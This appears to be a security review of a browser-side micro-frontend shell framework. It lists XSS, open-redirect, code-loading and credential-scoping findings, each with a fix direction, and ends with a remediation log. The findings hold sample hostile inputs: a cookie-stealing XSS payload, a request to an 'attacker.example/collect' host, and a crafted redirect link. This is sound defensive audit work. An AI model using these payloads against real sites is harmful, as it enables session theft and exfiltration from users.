# Trailhead Security / Pen-Test Review — Shell + Adapters

**Date:** 2026-10-03
**Scope:** `packages/core` (shell framework), `packages/webawesome` + `packages/cloudscape` (adapters),
the two example sites' shell entrypoints, and the gateway build/deploy scripts under `examples/`.
**Reviewer:** security pass, read-only. No code was changed — this document is the gap list to close from.
**Method:** manual source review of the client-side orchestration and both adapter implementations,
tracing every point where externally-controlled data (`shell.json`, server error responses, the
HTTP layer, `BroadcastChannel`, dynamic `import`/`<script>`) reaches a DOM sink, a navigation, or a
code-load. This is a browser-side framework with no server component of its own, so the threat model
is client-side: XSS, open redirect, untrusted code loading, and the same-origin trust assumptions the
micro-frontend model rests on.

---

## Threat model in one paragraph

Trailhead is a shell that boots in the browser, fetches a `shell.json` manifest from its own origin,
renders a nav menu from it, and dynamically loads independent SPAs (`app.js`) into one shared origin
and one shared `window.shell`. Everything runs with the user's session cookies. The assets the shell
loads (`shell.json`, each `app.js`) are served from the same bucket/origin as the shell, so **whoever
can write to that origin already owns the page** — that is the baseline. The interesting findings are
therefore (a) places where data that *looks* like trusted config can actually be influenced by a less
privileged party, and (b) missing defence-in-depth that would blunt the blast radius of a compromised
app or a malicious `shell.json`.

---

## Findings summary

| # | Severity | Title | Location |
|---|----------|-------|----------|
| H-1 | High (conditional) | Unescaped `shell.json` fields rendered via `innerHTML` → stored XSS | `packages/core/src/shell.ts` `renderNavigation()` |
| H-2 | High | No Content-Security-Policy anywhere | all `index.html`, gateway docs |
| M-1 | Medium | Dynamic `<script>`/`import()` from manifest-derived path with no integrity/allowlist | `packages/core/src/shell.ts` `loadPlugin()` |
| M-2 | Medium | Open-redirect-style nav hrefs from `shell.json` (`javascript:` / external) | `shell.ts` + `cloudscape/shell-layout.tsx` |
| M-3 | Medium | `shell.http` `isAbsoluteUrl` lets any app send cookies/`apiUrl` creds to arbitrary origins | `packages/core/src/lib/http.ts` |
| M-4 | Medium | Session-recovery `return` param reflected into redirect — open redirect if gateway trusts it | `packages/core/src/lib/session-recovery.ts` |
| L-1 | Low | `BroadcastChannel` reauth success is spoofable same-origin (acknowledged in-code) | `packages/core/src/lib/reauth.ts` |
| L-2 | Low | Credentials held in JS memory / FormData; optimistic modal close | both adapters |
| L-3 | Low | Error `message` from server surfaced in toast (escaped, but worth noting) | `http.ts` + adapters |
| L-4 | Low | `deploy-to-gateway.sh` `--delete` sync is destructive; path/prefix injection surface | `examples/deploy-to-gateway.sh` |
| I-1 | Info | No Subresource Integrity on dynamically injected CSS/JS/theme links | `shell.ts`, both adapters |
| I-2 | Info | `window.shell` is a global, shared, unauthenticated capability bus | `shell.ts` `createAPI()` |

---

## H-1 — Unescaped `shell.json` fields → DOM-based / stored XSS

**Where:** `packages/core/src/shell.ts`, `renderNavigation()`.

```ts
const renderLink = (item: NavLink, isChild = false): string => {
  const external = item.external === true || isExternal(item.href);
  const href = external ? item.href : this.appBasePath + item.href;
  return `<a href="${href}" ... data-path="${item.href}" ...>
    <i class="shell-icon shell-icon-${item.icon ?? ""}"></i>
    <span class="shell-nav-label">${item.label}</span>
  </a>`;
};
// ...
nav.innerHTML = [...this.nav].sort(...).map(...).join("");
```

`item.href`, `item.icon`, and `item.label` come straight from `shell.json` and are interpolated into
an `innerHTML` string **with no escaping**. Any one of them can break out of its context:

- `label` / `icon`: a value like `</span><img src=x onerror=alert(document.cookie)>` executes.
- `href`: `"><script>…` or an `onmouseover=` attribute injected via the unquoted-by-breakout path.

Contrast this with the adapters, which *do* escape (see `escapeHtml` in `webawesome/src/adapter.ts`,
and CloudScape rendering nav text through React, which auto-escapes). The core shell is the one place
that interpolates raw.

**Why it is "conditional High" and not a flat High:** `shell.json` is normally served from the same
origin as the shell, so an attacker who can rewrite it already controls the page. The finding becomes
a genuine privilege-escalation XSS when **any** of these is true, and in a multi-tenant / SaaS shell at
least one usually is:

- `shell.json` (or the nav portion of it) is generated from user-controllable data — tenant names,
  user-defined dashboards, app titles pulled from a DB.
- A lower-privileged role can edit navigation but is not supposed to run script.
- The manifest is ever served from a different trust tier than the shell bundle (a CDN edge, a
  partner-supplied manifest, a `shellUrl` pointing elsewhere).

**Fix direction (later):** build the nav with DOM APIs (`createElement` + `textContent` + `setAttribute`)
instead of an `innerHTML` string, or escape every interpolated field the way the adapters already do,
and validate/parse `shell.json` against a schema on load. The CloudScape adapter is already safe here
because React escapes; parity means making core's own renderer safe too.

---

## H-2 — No Content-Security-Policy

**Where:** both `examples/*/shell/index.html`, and the gateway deployment docs — a repo-wide grep for
`content-security-policy` / `csp` returns nothing but a `meta[property=csp-nonce]` reference inside the
bundled Vite/React runtime (i.e. the framework *supports* a nonce, but none is set).

There is no CSP delivered by the HTML and none documented as being set at the gateway/CloudFront edge.
A CSP is the single highest-leverage mitigation here: it would turn H-1 and a compromised-`app.js` from
"runs arbitrary script with the user's session" into "blocked by policy". Because the shell deliberately
loads apps as `<script type="module">` from its own origin, a workable policy is very achievable
(`script-src 'self'`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, a
`connect-src` allowlist that matches `apiUrl`).

**Fix direction (later):** set a CSP header at the gateway (preferred — covers every route) or a
`<meta http-equiv>` fallback in the shell `index.html`. The dynamic-import machinery already reads a
`csp-nonce` meta tag (visible in the bundled Vite preload helper), so a nonce-based policy is
compatible with the current loader with little work. Pair with `X-Content-Type-Options: nosniff`,
`Referrer-Policy`, and `X-Frame-Options`/`frame-ancestors`.

---

## M-1 — Dynamic code load from manifest-derived path, no integrity / no allowlist

**Where:** `packages/core/src/shell.ts`, `loadPlugin()`.

```ts
const pluginUrl = `${this.appBasePath}${appPath}/app.js`;
const script = document.createElement("script");
script.src = pluginUrl;
script.type = "module";
document.body.appendChild(script);
// dev path: await import(`${this.appBasePath}${appPath}/src/index.ts`)  // @vite-ignore
```

`appPath` is `AppEntry.basePath` from `shell.json`. It is concatenated into a script URL and the module
is loaded and executed. There is:

- **no Subresource Integrity** (`integrity=`) on the injected script or CSS;
- **no allowlist** of permitted app paths — any `basePath` the manifest names is loaded and run;
- the handler routes on `path.startsWith(entry.basePath)` and then loads `${appPath}/app.js`.

Same baseline caveat as H-1 (same-origin manifest ⇒ attacker already won), but combined with H-1 this
is the execution step: a manifest a lesser party can influence selects which code runs in the shared
origin. The `@vite-ignore` dynamic import on the dev path would also happily load a `basePath` that
escapes the intended prefix (e.g. `../`), though dev-only.

**Fix direction (later):** validate `basePath`/`src` against a strict pattern (no `..`, no scheme, no
`//`), consider an explicit allowlist, and — if apps are versioned/pinned — add SRI hashes to the
injected `<script>`/`<link>`. A CSP `script-src 'self'` (H-2) also bounds this.

---

## M-2 — Nav hrefs can be `javascript:` or arbitrary external (open redirect / script URL)

**Where:** `shell.ts` `renderNavigation()` and `cloudscape/src/shell-layout.tsx` — both use the same
`isExternal` test:

```ts
const isExternal = (href: string) => /^https?:\/\/|^\/\//.test(href);
// external links render href verbatim and are NOT intercepted by the SPA router
```

Two issues:

1. **`javascript:` URLs** are not matched by `isExternal`, so they fall into the "internal" branch and
   get `appBasePath` prepended (defusing them *by accident* in core) — but in the CloudScape layout the
   href is handed to CloudScape's `SideNavigation` and the click handler calls `onNavigate(href)` →
   `window.location.href = path`. A crafted `href` is worth hardening against rather than relying on an
   accidental prefix save. (In core, `renderLink` also drops `javascript:` into the raw `innerHTML`
   `href="..."` attribute — see H-1 — which is the more direct problem.)
2. **External links** (`https://…`, `//host`) render verbatim and open as-is. If `shell.json` is at all
   influenceable, that is a one-click redirect to an attacker origin presented inside your trusted
   chrome. Add `rel="noopener noreferrer"` for any external target as well (currently absent).

**Fix direction (later):** validate `href` scheme on load (allow only `/`-relative, `http(s)://`, and
your own `_auth` paths; reject `javascript:`, `data:`, `vbscript:`); add `rel="noopener noreferrer"`
and `target` handling for external links.

---

## M-3 — `shell.http` will send credentials to any absolute URL an app passes

**Where:** `packages/core/src/lib/http.ts`, `isAbsoluteUrl()` + `request()`.

```ts
function isAbsoluteUrl(url: string): boolean {
  return /^[a-z][a-z0-9+.-]*:\/\//i.test(url) || url.startsWith("//");
}
const resolvedUrl = isAbsoluteUrl(url) ? url : `${baseUrl}${url}`;
```

The guard exists to stop `apiUrl` being prepended to an already-absolute URL. The side effect is that
**any hosted app can call `shell.http.get("https://attacker.example/collect")`** and the shell issues
it. ky's default `credentials` is `same-origin`, so cookies are not sent cross-origin by default —
good — but: (a) any `headers` the app sets (including bearer tokens an app has) go out; (b) a
`//attacker` protocol-relative URL inherits the current scheme and is trivially missable in review;
(c) if a future change sets `credentials: 'include'` for the gateway proxy, this becomes a straight
credential exfiltration primitive. This is a capability-scoping gap: `shell.http` is meant to be "talk
to *our* API", but it will talk to anywhere.

**Fix direction (later):** make `shell.http` reject or explicitly opt-in absolute/cross-origin targets
(allowlist of permitted origins, or refuse anything that is not same-origin or under `apiUrl`). Pair
with a CSP `connect-src` allowlist (H-2) as the enforcement backstop.

---

## M-4 — Reflected `return` param in session-recovery redirect

**Where:** `packages/core/src/lib/session-recovery.ts`, `recoverSession()`.

```ts
const returnTo = encodeURIComponent(env.currentPath());
env.redirect(`${signinPath}?return=${returnTo}`);
```

Core itself only ever puts `location.pathname + location.search` into `return`, and it URL-encodes it,
so core is not the vulnerable party. The risk is **downstream**: this hands a `return` parameter to the
gateway's `/_auth/signin`. If the jwt-auth-gateway blindly redirects back to whatever `return` holds
after sign-in, that is a classic post-auth open redirect — and because the value is attacker-reachable
(anyone can craft a link to `/_auth/signin?return=https://evil`), the gateway must validate it. Flagging
here so the shell↔gateway contract is reviewed as a pair: **the gateway must only honour same-origin,
path-only `return` values.** (This is the natural companion to the `jwt-auth-gateway` work in the
`aws-static-hosting` repo.)

**Fix direction (later):** confirm/999 the gateway validates `return` (path-only, same-origin). No core
change strictly required, but core could additionally strip to a path before sending.

---

## L-1 — Spoofable `BroadcastChannel` reauth signal (already acknowledged)

**Where:** `packages/core/src/lib/reauth.ts`. The code comments already state this plainly: the
`trailhead-reauth` channel's `{channel, type:"success"}` message is not a security boundary — any
same-origin script can post it and satisfy a pending credential prompt in another tab. The in-code
reasoning (shared-origin trust is the real boundary; don't co-host mutually-untrusted apps) is correct.

**Residual risk:** a compromised/malicious app can dismiss another tab's reauth prompt (resolve it as
"succeeded elsewhere") — a nuisance/possible confusion vector, not a credential leak. Accept and
document, or move the reauth coordination behind the shell with a per-session nonce if you ever host
mutually-distrusting apps. No action needed under the current single-trust-tier model.

---

## L-2 — Credential handling in the auth prompt

**Where:** `webawesome/src/adapter.ts` `WebAwesomeAuthAdapter`, `cloudscape/src/shell-app.tsx` auth modal.

Passwords live in JS memory (`FormData` / React state) and are passed to an app-supplied `attempt()`
callback. This is inherent to in-place reauth and generally fine, but note:

- The CloudScape modal keeps `authPassword` in React state and closes optimistically on submit; the
  value is cleared on the next prompt open, not immediately on submit. Minor — clear on submit.
- Both correctly use `type="password"` and `autocomplete="current-password"`.
- No field-level throttling/attempt cap in the client (the server must own rate-limiting — confirm it
  does).

**Fix direction (later):** zero out the password state immediately after handing it to `attempt()`;
confirm server-side auth throttling.

---

## L-3 — Server error text surfaced in toast

**Where:** `http.ts` sets `error.message = error.data.message || error.message` from the parsed
response body; adapters display it. The WebAwesome adapter **escapes** it (`escapeHtml`) before
`innerHTML`, and CloudScape renders through React, so this is **not** an XSS today. Noted only so the
escaping stays — any future adapter that interpolates a toast message without escaping reintroduces XSS
from a malicious/compromised API. Make "escape all adapter-rendered text" an explicit adapter-contract
requirement in `docs/CREATING_ADAPTERS.md`.

---

## L-4 — Deploy script blast radius

**Where:** `examples/deploy-to-gateway.sh`.

- Uses `aws s3 sync --delete`, which deletes bucket objects not present locally. The script does a
  dry-run and prompts first (good), and `YES=1`/`-y` bypasses the prompt (expected for CI). The hazard
  is the standard one: pointing it at the wrong bucket/prefix deletes a live site. The guardrails are
  reasonable; keep the confirm prompt and never default `YES=1`.
- `APP_BASE_PATH`, `bucket`, `region` are interpolated into `aws` args as array elements (`profile_args`,
  `region_args`) — correctly quoted, so no shell-injection via those. `dest="s3://${bucket}${APP_BASE_PATH}"`
  is fine for intended use; a hostile `bucket`/`APP_BASE_PATH` could retarget the sync, but these are
  operator-supplied, not attacker-supplied — low risk.
- `build-for-gateway.sh` runs `npm run build` for each app and uses `perl -0pi` to inject
  `window.APP_CONFIG`. `API_URL`/`AUTH_MODE` are interpolated into the injected `<script>` **unescaped**;
  an operator setting `API_URL` to a value containing `</script>` would break out, but again operator-
  supplied. Worth a note: these knobs end up as live JS in every route's `index.html`.

**Fix direction (later):** keep the `--delete` confirm prompt; document that `API_URL`/`AUTH_MODE` must
be simple tokens; consider `--exact-timestamps` and a bucket-name sanity assertion.

---

## I-1 — No Subresource Integrity on injected assets

The shell and both adapters inject `<link rel="stylesheet">` and `<script>` / dynamic `import()` for the
theme CSS, Web Awesome loader, CloudScape CSS, and each app bundle, none with an `integrity` attribute.
Same-origin assets make SRI less critical, but any asset pulled from a CDN (Web Awesome from a CDN URL,
`webAwesomeUrl`/`cloudscapeUrl` overrides) should carry SRI. Low priority; revisit if any asset origin
is not the shell's own bucket.

---

## I-2 — `window.shell` is a shared, unauthenticated capability bus

By design, `createAPI()` exposes `window.shell` to every app on the page: HTTP client, navigation,
toasts/dialogs, and `auth.reauthenticate`/`recoverSession`. Any app (and anything injected via H-1/M-1)
has the full capability set. This is the documented micro-frontend trust model (one origin, mutual
trust) and is a *design decision*, not a bug — but it is the amplifier that makes H-1/M-1/M-3 matter.
Record it explicitly in the security docs so deployers know the rule: **do not co-host
mutually-untrusted apps on one Trailhead origin.**

---

## Recommended order to close gaps

1. **H-2 (CSP at the gateway)** — biggest blast-radius reduction, no app changes, mitigates H-1/M-1/M-3.
2. **H-1 (escape/DOM-build the nav + schema-validate `shell.json`)** — removes the primary XSS sink;
   brings core to parity with the already-safe CloudScape path.
3. **M-2 (href scheme allowlist + `rel=noopener`)** — small, closes the redirect/script-URL surface.
4. **M-3 (scope `shell.http` to same-origin/`apiUrl` allowlist)** — closes the exfiltration capability.
5. **M-4 (verify gateway validates `return`)** — cross-repo check with jwt-auth-gateway.
6. **M-1 (validate `basePath`/`src`, add SRI if apps are pinned)** — defence in depth once CSP is in.
7. **L-1 / L-2 / L-3 / I-1 / I-2** — document the trust model, keep adapter-escaping a hard contract,
   tidy credential lifetime. Mostly documentation + hygiene.

---

## What was NOT a problem (verified)

- Adapter toast/dialog/auth text **is** HTML-escaped (`escapeHtml`) in WebAwesome, and React-escaped in
  CloudScape — no XSS via server error messages today (L-3).
- `isAbsoluteUrl` correctly prevents `apiUrl` mangling; ky defaults to `same-origin` credentials, so no
  automatic cookie leak cross-origin (the M-3 concern is about app-set headers and a possible future
  `credentials: 'include'`, not today's cookie behaviour).
- The reauth `BroadcastChannel` spoofability is already understood and documented in-code; it is not a
  credential-disclosure path.
- Deploy scripts quote their AWS args as array elements — no shell injection via profile/region/bucket.

---

## Remediation status (2026-10-03)

Each change below went test-first: characterisation tests for the current behaviour were added and
passing before the code was touched, then the failing security tests, then the fix.

| # | Status | Change | Tests |
|---|--------|--------|-------|
| H-1 | **Fixed** (core) | `renderNavigation()` builds the nav with DOM APIs (`textContent`/`setAttribute`); no HTML strings. `loadPlugin()` error message also set via `textContent`. | `core/__tests__/shell.test.ts` — "navigation rendering", "hostile shell.json" |
| M-2 | **Fixed** (core + CloudScape) | Nav hrefs resolved with `new URL(href, document.baseURI)`; anything not `http(s)` is dropped, and internal links must stay same-origin. External links get `rel="noopener noreferrer"` (core). `shell.navigation.navigate()` refuses non-`http(s)`/off-origin targets. CloudScape now also honours `external: true` like core. | core as above; `cloudscape/__tests__/shell-layout.test.tsx` |
| M-1 | **Fixed** (core, validation only) | `shell.json` app entries with a `basePath` that isn't `/`-rooted segments (no `..`, `//`, scheme) or a `src` that isn't a single safe segment are dropped with a warning. No allowlist/SRI — revisit after H-2. | "app manifest validation (M-1)" |
| L-2 | **Fixed** (CloudScape) | Password state cleared on submit. Web Awesome already removes the dialog on hide. | `cloudscape/__tests__/shell-app.test.tsx` |
| M-3 | Open — needs decision | Scoping `shell.http` to same-origin/`apiUrl` is a breaking change (absolute URLs are currently a tested, supported feature). | — |
| M-4 | No core change needed | `currentPath()` is already `pathname + search` only. The gateway-side validation of `return` is still to be checked in `aws-static-hosting`. | existing `session-recovery.test.ts` |
| H-2 | In progress | Plan: strict `script-src 'self'` policy via a CloudFront response headers policy in `aws-static-hosting`. Prerequisite done in core 0.6.0: `apiUrl`/`auth` can come from `shell.json`, so the inline `window.APP_CONFIG` script can go. Remaining: migrate the example shells and `build-for-gateway.sh`, then roll out Report-Only → enforce. Accepted: CloudScape global styles from `unpkg.com` and Web Awesome icons from `ka-f.fontawesome.com` (allowlisted rather than self-hosted). | `core/__tests__/shell-config.test.ts` |
| L-1, L-3, L-4, I-1, I-2 | Open | Documentation and deploy-script hygiene; can't be covered by unit tests. | — |

The CloudScape guard is a local copy of core's `isSafeHref` because the adapter builds against the
published `@herdingbits/trailhead-core`. Fold it into a core export at the next coordinated release.
